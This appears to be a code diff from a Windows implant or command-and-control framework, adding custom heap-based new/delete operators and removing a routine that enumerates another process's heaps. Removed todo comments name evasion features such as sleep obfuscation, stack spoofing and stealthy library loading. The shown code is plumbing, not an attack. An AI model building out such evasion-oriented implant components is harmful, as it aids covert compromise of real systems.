@@ -1,13 +1,40 @@
 #include <core/include/memory.hpp>
-#ifndef ENDIANESS
-#define ENDIANESS 1
-#endif
 
-/*
- * todo: add foliage/silent moonwalk
- * todo: add dark loadlibrary
- * todo: error responses
- */
+void* operator new(std::size_t size) {
+    HEXANE
+
+    void *ptr = { };
+
+    if (Ctx->heap && Ctx->nt.RtlAllocateHeap) {
+        ptr = Ctx->nt.RtlAllocateHeap(Ctx->heap, 0, size);
+
+        if (!ptr) {
+            NtCurrentTeb()->LastErrorValue = ERROR_NOT_ENOUGH_MEMORY;
+        }
+    }
+
+    return ptr;
+}
+
+void operator delete(void* ptr) noexcept {
+    HEXANE
+
+    if (Ctx->heap && Ctx->nt.RtlFreeHeap && ptr) {
+        if (!Ctx->nt.RtlFreeHeap(Ctx->heap, 0, ptr)) {
+            NtCurrentTeb()->LastErrorValue = ERROR_INVALID_PARAMETER;
+        }
+    }
+}
+
+void* operator new[](std::size_t size) {
+    return ::operator new(size);
+}
+
+void operator delete[](void* ptr) noexcept {
+    ::operator delete(ptr);
+}
+
+
 
 namespace Memory {
     LPVOID ExceptionReturn = { };
@@ -22,28 +49,6 @@ namespace Memory {
                 cookie = 0;
             }
             return cookie;
-        }
-
-        VOID GetProcessHeaps(HANDLE process, const uint32_t access, const uint32_t pid) {
-            HEXANE
-
-            HANDLE      snap    = { };
-            HEAPLIST32  heaps   = { };
-
-            heaps.dwSize = sizeof(HEAPLIST32);
-
-            x_ntassert(Process::NtOpenProcess(&process, access, pid));
-            x_assert(snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid));
-
-            if (Ctx->win32.Heap32ListFirst(snap, &heaps)) {
-                do {
-                    //_heap_info heap_info = {heaps.th32HeapID, heaps.th32ProcessID};
-                    //m_heaps.push_back(heap_info);
-                }
-                while (Ctx->win32.Heap32ListNext(snap, &heaps));
-            }
-
-        defer:
         }
 
         _resource* GetIntResource(HMODULE base, const int rsrc_id) {
